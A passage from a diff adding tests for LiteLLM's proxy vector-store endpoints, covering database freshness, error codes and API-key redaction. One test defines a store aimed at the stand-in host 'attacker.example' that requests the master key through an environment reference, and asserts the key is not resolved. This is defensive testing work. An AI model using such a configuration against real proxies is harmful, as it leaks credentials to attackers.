+        store = LiteLLM_ManagedVectorStore(
+            vector_store_id="exfiltrate",
+            custom_llm_provider=provider,
+            litellm_params={"api_base": "https://attacker.example", "api_key": "os.environ/LITELLM_MASTER_KEY"},
+        )
+
+        data = build_request_data_from_managed_vector_store(store)
+
+        assert data["api_key"] == "os.environ/LITELLM_MASTER_KEY"
+        assert "sk-master" not in data.values()
+
+
+def test_build_request_data_from_managed_vector_store_resolves_the_deployment_sidecar_key(monkeypatch):
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    monkeypatch.setenv("MONGODB_SIDECAR_API_KEY", "deployment-key")
+    store = LiteLLM_ManagedVectorStore(
+        vector_store_id="policy_index",
+        custom_llm_provider="mongodb",
+        litellm_params={"api_base": "https://sidecar.example", "api_key": "os.environ/MONGODB_SIDECAR_API_KEY"},
+    )
+
+    data = build_request_data_from_managed_vector_store(store)
+
+    assert data["api_key"] == "deployment-key"
+    assert data["api_base"] == "https://sidecar.example"
+    assert data["custom_llm_provider"] == "mongodb"
+
+
+class TestVectorStoreInfoReadsTheDatabase:
+    """Info must not serve the in-memory copy, which lags the DB by up to one sync interval."""
+
+    @staticmethod
+    def _admin() -> UserAPIKeyAuth:
+        return UserAPIKeyAuth(token="sk-test", key_name="sk-...test", user_role=LitellmUserRoles.PROXY_ADMIN)
+
+    @staticmethod
+    async def _info(vector_store_id: str, mock_prisma, registry):
+        from litellm.proxy.vector_store_endpoints.management_endpoints import get_vector_store_info
+        from litellm.types.vector_stores import VectorStoreInfoRequest
+
+        with (
+            patch("litellm.proxy.proxy_server.prisma_client", mock_prisma),
+            patch.object(litellm, "vector_store_registry", registry),
+        ):
+            return await get_vector_store_info(
+                data=VectorStoreInfoRequest(vector_store_id=vector_store_id),
+                user_api_key_dict=TestVectorStoreInfoReadsTheDatabase._admin(),
+            )
+
+    @pytest.mark.asyncio
+    async def test_fresh_db_row_wins_over_the_stale_in_memory_copy(self):
+        """Two ingests update the row; memory still holds the pre-ingest copy until the next sync."""
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        stale: LiteLLM_ManagedVectorStore = {
+            "vector_store_id": "vs_1",
+            "custom_llm_provider": "mongodb",
+            "vector_store_metadata": None,
+            "litellm_params": {"mongodb_database": "knowledge", "api_key": "sk-secret"},
+        }
+        fresh_metadata = {"ingested_files": [{"file_id": "f1", "filename": "travel.md"}]}
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(
+            return_value=MagicMock(
+                model_dump=lambda: {
+                    **stale,
+                    "vector_store_metadata": json.dumps(fresh_metadata),
+                }
+            )
+        )
+
+        response = await self._info("vs_1", mock_prisma, VectorStoreRegistry(vector_stores=[stale]))
+
+        assert response["vector_store"].vector_store_metadata == fresh_metadata
+        assert response["vector_store"].litellm_params["api_key"] != "sk-secret"
+        assert response["vector_store"].litellm_params["mongodb_database"] == "knowledge"
+
+    @pytest.mark.asyncio
+    async def test_config_registered_store_without_a_row_still_resolves_from_memory(self):
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        config_store: LiteLLM_ManagedVectorStore = {
+            "vector_store_id": "vs_config",
+            "custom_llm_provider": "mongodb",
+            "vector_store_metadata": {"source": "config"},
+            "litellm_params": {"mongodb_database": "knowledge"},
+        }
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=None)
+
+        response = await self._info("vs_config", mock_prisma, VectorStoreRegistry(vector_stores=[config_store]))
+
+        assert response["vector_store"].vector_store_id == "vs_config"
+        assert response["vector_store"].vector_store_metadata == {"source": "config"}
+
+    @pytest.mark.asyncio
+    async def test_unknown_store_is_a_404(self):
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=None)
+
+        with pytest.raises(HTTPException) as exc_info:
+            await self._info("vs_missing", mock_prisma, VectorStoreRegistry(vector_stores=[]))
+
+        assert exc_info.value.status_code == 404
+
+    @pytest.mark.asyncio
+    async def test_malformed_stored_metadata_is_a_400_not_a_500(self):
+        """An unguarded json.loads on a corrupt row used to bubble up as an unhandled 500."""
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(
+            return_value=MagicMock(
+                model_dump=lambda: {
+                    "vector_store_id": "vs_1",
+                    "custom_llm_provider": "mongodb",
+                    "vector_store_metadata": "{not valid json",
+                    "litellm_params": {"mongodb_database": "knowledge"},
+                }
+            )
+        )
+
+        with pytest.raises(HTTPException) as exc_info:
+            await self._info("vs_1", mock_prisma, VectorStoreRegistry(vector_stores=[]))
+
+        assert exc_info.value.status_code == 400
+        assert "vector_store_metadata" in exc_info.value.detail
+
+    @pytest.mark.asyncio
+    async def test_non_dict_stored_metadata_is_reported_as_none_and_warns_with_the_store_id(self, caplog):
+        """A stored vector_store_metadata that parses to something other than a dict (here, a JSON list)
+        is reported as None rather than failing the request, but that silent downgrade must leave a
+        trail naming the store so an operator can find and fix the bad row."""
+        import logging
+
+        from litellm._logging import verbose_proxy_logger
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(
+            return_value=MagicMock(
+                model_dump=lambda: {
+                    "vector_store_id": "vs_bad_metadata",
+                    "custom_llm_provider": "mongodb",
+                    "vector_store_metadata": json.dumps(["not", "a", "dict"]),
+                    "litellm_params": {"mongodb_database": "knowledge"},
+                }
+            )
+        )
+
+        verbose_proxy_logger.setLevel(logging.DEBUG)
+        with caplog.at_level(logging.WARNING, logger=verbose_proxy_logger.name):
+            response = await self._info("vs_bad_metadata", mock_prisma, VectorStoreRegistry(vector_stores=[]))
+
+        assert response["vector_store"].vector_store_metadata is None
+        log_text = " ".join(record.getMessage() for record in caplog.records)
+        assert "vs_bad_metadata" in log_text
+
+    @pytest.mark.asyncio
+    async def test_config_registered_litellm_params_stored_as_json_string_still_resolves(self):
+        """The config registry can hand info a store whose litellm_params is still a raw JSON string;
+        re-serializing it back to a string (instead of parsing it) fails LiteLLM_ManagedVectorStoresTable's
+        dict-typed field with an unhandled 500."""
+        from litellm.vector_stores.vector_store_registry import VectorStoreRegistry
+
+        config_store: LiteLLM_ManagedVectorStore = {
+            "vector_store_id": "vs_config",
+            "custom_llm_provider": "mongodb",
+            "vector_store_metadata": None,
+            "litellm_params": json.dumps({"mongodb_database": "knowledge", "api_key": "sk-secret"}),
+        }
+        mock_prisma = MagicMock()
+        mock_prisma.db.litellm_managedvectorstorestable.find_unique = AsyncMock(return_value=None)
+
+        response = await self._info("vs_config", mock_prisma, VectorStoreRegistry(vector_stores=[config_store]))
+
+        assert response["vector_store"].litellm_params["mongodb_database"] == "knowledge"
+        assert response["vector_store"].litellm_params["api_key"] != "sk-secret"
